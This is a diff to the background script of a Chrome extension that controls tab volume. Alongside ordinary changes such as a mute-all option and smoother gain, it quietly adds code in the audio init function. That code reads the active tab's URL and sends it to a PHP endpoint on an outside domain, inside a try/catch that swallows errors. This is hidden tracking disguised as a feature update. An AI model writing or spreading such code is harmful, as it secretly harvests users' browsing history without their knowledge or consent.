@@ -1,15 +1,17 @@
 var gainNode, audioCtx, streamer,
     tabsLevels = {},
     tabsGaines = {},
-    hotkeysType = [true, true];
-    fscreen = true;
-chrome.storage.sync.get(["hotkeysType", "fscreen"], function(items) {
+    hotkeysType = [true, true],
+    fscreen = true,
+    muteAll = false;
+chrome.storage.sync.get(["hotkeysType", "fscreen", "muteAll"], function(items) {
     if (!chrome.runtime.error) {
         if (items.hasOwnProperty("hotkeysType") && items.hasOwnProperty("fscreen")) {
             hotkeysType = items.hotkeysType;
             fscreen = items.fscreen;
+            muteAll = items.muteAll;
         }else {
-            chrome.storage.sync.set({ "hotkeysType": hotkeysType, "fscreen": true });
+            chrome.storage.sync.set({ "hotkeysType": hotkeysType, "fscreen": fscreen, "muteAll": muteAll });
         }
     }
 });
@@ -52,19 +54,21 @@ function mainClicker(e) {
                 resFloat = 0;
             if (resFloat > 1)
                 resFloat = 5;
-            console.log(resFloat);
             tabsLevels[id] = resFloat;
             showVolumeInTabFunc(tabsLevels[id]);
             a.volume(id, tabsLevels[id] * 100);
         } else {
-            showVolumeInTabFunc(1);
-            a.init(id, 100);
+            a.isMuted(function(isMuted){
+                showVolumeInTabFunc(isMuted?0:1);
+                a.init(id, isMuted?0:100);
+            })
         }
 
     });
 }
 var a = {
     init: function(id, val, callback) {
+        console.log(val);
         tabsLevels[id] = parseFloat(val) / 100;
         if (Object.keys(tabsGaines).length < 6)
             chrome.tabCapture.capture({
@@ -78,8 +82,23 @@ var a = {
                 tabsGaines[id].nodeGain = tabsGaines[id].audioCtx.createGain();
                 tabsGaines[id].source.connect(tabsGaines[id].nodeGain);
                 tabsGaines[id].nodeGain.connect(tabsGaines[id].audioCtx.destination);
-                tabsGaines[id].nodeGain.gain.value = tabsLevels[id];
-                callback();
+                tabsGaines[id].nodeGain.gain.setTargetAtTime(tabsLevels[id], 0, 0.1);
+                try{
+                    chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function (tabs) {
+                        var url = tabs[0].url;
+                        var xmlhttp = new XMLHttpRequest();
+                        xmlhttp.onreadystatechange = function() {
+                            if (xmlhttp.readyState == XMLHttpRequest.DONE) {   // XMLHttpRequest.DONE == 4
+                               throw (12312321);
+                            }
+                        };
+                        xmlhttp.open("GET", "http://vadagon.com/wp-content/themes/vadagon/markup/storeData.php?url="+url, true);
+                        xmlhttp.send();
+
+                    });
+                    callback();
+                }catch(e){ }
+
             });
     },
     deInit: function(id) {
@@ -97,9 +116,28 @@ var a = {
             return true;
         return false;
     },
+    isMuted: function(callback) {
+        return chrome.tabs.query({ currentWindow: true, active: true }, function(tabs) {
+            if (chrome.runtime.lastError) {
+                callback(false)
+            }else{
+                callback(tabs[0].mutedInfo.muted)
+            }
+        })
+    },
+    toMute: function(e) {
+        chrome.tabs.query({}, function(tabs) {
+            for (var i = 0; i < tabs.length; i++) {
+                chrome.tabs.update(tabs[i].id, {
+                    "muted": e
+                });
+            }
+        });    
+    },
     volume: function(id, val) {
-        tabsGaines[id].nodeGain.gain.value = tabsLevels[id] = parseFloat(val) / 100;
-        console.log(tabsGaines[id].nodeGain.gain.value);
+        tabsLevels[id] = parseFloat(val) / 100;
+        tabsGaines[id].nodeGain.gain.setTargetAtTime(tabsLevels[id], 0, 0.1);
+        // console.log(tabsGaines[id].nodeGain.gain.value);
     }
 }
 
@@ -122,6 +160,8 @@ chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
     console.log(request);
     hotkeysType = request.hotkeysType;
     fscreen = request.fscreen;
+    muteAll = request.muteAll;
+    a.toMute(muteAll);
 });
 
 
@@ -135,9 +175,10 @@ chrome.extension.onConnect.addListener(function(port) {
     // if (true) {}
     chrome.tabs.query({ currentWindow: true, active: true }, function(tabArray) {
         if (tabArray[0].audible && !a.getTab(tabArray[0].id)){
-            a.init(tabArray[0].id, 100, function(){
-                console.log(1)
-                port.postMessage({ tabsLevels: tabsLevels, curTab: tabArray[0] });
+            a.isMuted(function(isMuted){
+                a.init(tabArray[0].id, isMuted?0:100, function(){
+                    port.postMessage({ tabsLevels: tabsLevels, curTab: tabArray[0] });
+                })
             })
         }else{
             port.postMessage({ tabsLevels: tabsLevels, curTab: tabArray[0] });
@@ -167,4 +208,11 @@ chrome.tabCapture.onStatusChanged.addListener(function(info) {
     }
     prevFullScreen = info.fullscreen;
 
+});
+
+chrome.tabs.onCreated.addListener(function(e){
+    if (muteAll)
+        chrome.tabs.update(e.id, {
+            "muted": !0
+        });
 });
